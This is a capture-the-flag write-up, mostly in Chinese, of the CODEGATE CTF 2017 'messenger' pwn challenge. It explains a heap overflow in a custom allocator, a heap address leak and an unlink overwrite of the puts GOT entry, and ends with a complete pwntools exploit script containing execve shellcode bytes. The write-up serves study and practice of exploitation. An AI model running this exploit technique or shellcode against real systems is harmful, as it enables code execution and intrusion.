title: '[CODEGATE CTF 2017] messenger 500'
author: Naetw
tags:
  - pwn
  - CODEGATE CTF 2017
  - heap overflow
  - unlink
categories:
  - write-ups
date: 2017-02-21 16:38:40
---
## Info  
> Category: pwn  
> Point: 500 
> Author: Naetw @ BambooFox   
> 這題比賽中沒有解出來，後來還是來練習一下


## Analyzing

64 bits ELF, Partial RELRO, 有 canary, 沒有 NX & PIE。

這題有五個選項：

[L]eave message：

* 最多只能留兩個 messages
* size 可以自己決定但是無法超過 32
* `malloc` 是作者自己實作的，rev 不太出來 Orz，不過這題重點不在這

[R]emove message：

* `free` 也是作者自己實作的，會做 unlink，這題就是要利用 unlink 讓 puts got.plt 指向我們寫的 shellcode
* remove 之後，紀錄 message 數量的 global variable 不會改動

[C]hange message：

* 這裡有個 overflow 的漏洞，他會先問 size 這時 size 給大一點的數便可以 overflow 來更改 chunk struct

[V]iew message：

* 可以利用這個來 leak heap address

[Q]uit：

* 離開程式

這邊先說明他的 heap struct(先假設已經留下一則 message size 8)：

```
            +-----------------------+
            | size      | fd        |  # 一開始就有的 Head
            +-----------------------+
            |           | size      |  # First message 
            | fd        | bk        |
            | data                  |
            +-----------------------+
            |           | size      |  # Top chunk
            |           | bk        |
            +-----------------------+
```

這裡的 fd, bk 會指向 chunk 儲存 size 的地方，而不是 data 開頭或是 chunk 開頭


## Exploit

首先，先留下一個訊息，接著利用 `change` 來做 overflow，之後利用 view 來 leak heap address。

一開始的 heap layout：

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000400           # Top chunk
0x603020:      0x0000000000000000      0x0000000000603000
0x603030:      0x0000000000000000      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000000
0x603050:      0x0000000000000000      0x0000000000000000
```

留下一則 size 8 的 message：

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x0000000041414141      0x0000000000000000
0x603040:      0x0000000000000000      0x00000000000003d0           # Top chunk
0x603050:      0x0000000000000000      0x0000000000603018
```

接下來利用 `change` 裡面的 overflow 來 leak heap address

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x4141414141414141      0x4141414141414141
0x603040:      0x4141414141414141      0x4141414141414141           # Top chunk
0x603050:      0x4141414141414141      0x0000000000603018
```

這時候利用 `view` 他會 output 40 個 A 之後把 `0x603018` leak 出來，算一下 offset 就可以拿到 `0x603000` 也就是 heap 的開頭

leak 完之後先把 heap 的 struct 恢復原樣，這邊就不放 layout 了，跟第二個 layout 一樣

恢復之後，在留下新的一則 message size 一樣是 8：

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x0000000041414141      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000031           # Second message
0x603050:      0x0000000000603018      0x0000000000603018
0x603060:      0x0000000042424242      0x0000000000000000
0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk
0x603080:      0x0000000000000000      0x0000000000603048
```

接著就是要利用 unlink 來讓 puts got.plt 指向我們寫的 shellcode，這邊先來看題目實作的 free code：

* buf - chunk 儲存 data 的開頭
* size_adr - chunk 儲存 size 的位置，也就是 fd, bk 會使用到的 address
* buf_bk - bk of current_freed_chunk
* buf_fd - fd of current_freed_chunk
* qword_6020B0 - 儲存 chunk 的 list

```
# list struct
0x6020b0:      0x0000000000603000      0x0000000000000000           # Head  | Nothing
0x6020c0:      0x0000000000603030      0x0000000000603060           # First | Second
```

```c
size_adr = buf-24;
buf_bk = *(_QWORD *)(buf-24+16);
buf_fd = *(_QWORD *)(buf-24+8);
if (buf_bk)
    *(_QWORD *)(buf_bk+8) = buf_fd;                         // 基本上就是讓 buf_bk chunk 的 fd 接到 current_freed_chunk->fd
if (buf_fd)
    *(_QWORD *)(buf_fd+16) = buf_bk;                        // 讓 buf_fd chunk 的 bk 接到 current_freed_chunk->bk
*(_QWORD *)(size_adr+8) = *(_QWORD *)(qword_6020B0+8)       // 讓 current_freed_chunk->fd 接到除了 Head 的第一個 chunk
if (*(_QWORD *)(qword_6020B0+8))
    *(_QWORD *)(*(_QWORD *)(qword_6020B0+8)+16) = size_adr; // 讓那第一個 chunk 的 bk 接到 current_freed_chunk
*(_QWORD *)(qword_6020B0+8) = size_adr;                     // 讓  Head 的 fd 接到 current_freed_chunk
*(_QWORD *)size_adr &= 0xFFFFFFFFFFFFFFFE;                  // clear inuse bit
```

這邊我利用的是讓 buf_bk chunk 的 fd 接到  `current_freed_chunk->fd` 這行，我把 buf_bk 設成 `puts_got-8` 的地方，然後 `current_freed_chunk->fd` 設成我寫 shellcode 的地方，這樣就會讓 `puts_got` 指向 address of shellcode，這樣一來 `free` 完呼叫 `puts` 時就會跳到 shellcode 上去執行

所以先用 `change` 的 overflow 漏洞來改寫 Second Chunk 的 struct，之後再來 free Second Chunk，把他 overflow 成以下樣子：

```
0x603000:      0x0000000000000018      0x0000000000603018           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603000
0x603030:      0x4141414141414141      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000031           # Second message
0x603050:      0x00000000006020a8      0x0000000000602010
0x603060:      0x4242424242424242      0x0000000000000000
0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk
0x603080:      0x0000000000000000      0x0000000000603048
0x603090:      0x0000000000000000      0x0000000000000000
0x6030a0:      0x0000000000000000      0x00000000000016eb
0x6030b0:      0x0000000000000000      0x0000000000000000
0x6030c0:      shellcode
```

* `0x602010` - `puts_got-8`
* `0x6020a8` - shellcode 位置

這邊會看到 shellcode 位置只擺了 `\xeb\x16`(jmp 0x18)，這是因為 unlink 的 side-effect，他會在 `0x6020a8+16` 的位置擺上 buf_bk：

```
0x603000:      0x0000000000000018      0x0000000000603048           # Head
0x603010:      0x0000000000000000      0x0000000000000031           # First message
0x603020:      0x0000000000603048      0x0000000000603048
0x603030:      0x4141414141414141      0x0000000000000000
0x603040:      0x0000000000000000      0x0000000000000030           # Second message
0x603050:      0x0000000000603018      0x0000000000602010
0x603060:      0x4242424242424242      0x0000000000000000
0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk
0x603080:      0x0000000000000000      0x0000000000603048
0x603090:      0x0000000000000000      0x0000000000000000
0x6030a0:      0x0000000000000000      0x00000000000016eb
0x6030b0:      0x0000000000000000      0x0000000000602010 <- buf_bk
0x6030c0:      shellcode
```

如果直接在 `0x6020a8` 放上 shellcode 會有一小段 shellcode 被 `0x602010` 寫爛，所以這邊不能直接放，而是利用了 `jmp 0x18` 讓 puts 跳過去的時候，再往前跳 `0x18`，這樣就會跳到 `0x6030c0` 真正 shellcode 所在的地方了

Final Exploit：

```python
#!/usr/bin/env python
# -*- coding: utf8 -*-
from pwn import * # pip install pwntools
import sys

r = process('./messenger')

def leave(size, msg):
    r.recvuntil('>>')
    r.sendline('L')
    r.recvuntil('size :')
    r.sendline(str(size))
    r.recvuntil('msg :')
    r.sendline(msg)

def change(idx, size, payload):
    r.recvuntil('>>')
    r.sendline('C')
    r.recvuntil('index :')
    r.sendline(str(idx))
    r.recvuntil('size :')
    r.sendline(str(size))
    r.recvuntil('msg :')
    r.send(payload)

def view(idx):
    r.recvuntil('>>')
    r.sendline('V')
    r.recvuntil('index :')
    r.sendline(str(idx))

def remove(idx):
    r.recvuntil('>>')
    r.sendline('R')
    r.recvuntil('index :')
    r.sendline(str(idx))

puts_got = 0x602018

# Leak top chunk
leave(8, 'A'*4)
change(0, 60, 'A'*40)
view(0)
r.recvuntil('A'*40)
x = r.recvline()[:-1]
heap = u64(x + '\x00'*(8-len(x))) - 0x18
log.info('heap : {}'.format(hex(heap)))

# Repair the heap struct
payload = 'A'*8 + p64(0)*2 + p64(0x3d0) + p64(0) + p64(heap+0x18)
change(0, 60, payload)

# Make another chunk and use overflow to make arbitratary free
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
leave(8, 'B'*4)
payload = 'A'*8
payload += p64(0)*2 + p64(0x31) + p64(heap+0xa8) + p64(puts_got-8)
payload += 'B'*8 + p64(0)*2 + p64(0x3a0) + p64(0) + p64(heap+0x48)
payload += p64(0)*3 + '\xeb\x16' +'\x00'*6 + p64(0)*2 + sc
change(0, len(payload)+4, payload)
remove(1)

r.interactive()
```
